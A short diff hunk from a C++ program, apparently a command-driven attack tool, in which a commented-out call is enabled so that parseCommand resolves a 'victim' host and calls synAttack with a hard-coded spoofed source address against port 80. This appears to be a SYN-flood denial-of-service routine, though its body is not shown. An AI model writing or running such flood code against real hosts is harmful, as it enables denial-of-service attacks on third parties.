@@ -130,7 +130,7 @@ void parseCommand(char command[])
         hostinfo = gethostbyname(victim);
         sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
         cout << victim_ip << endl;
-        //synAttack(victim, 22000, victim, 80, 3);
+        synAttack("192.168.1.2", 22000, victim_ip, 80, 3);
         cout << "Done" << endl;
     }
     else
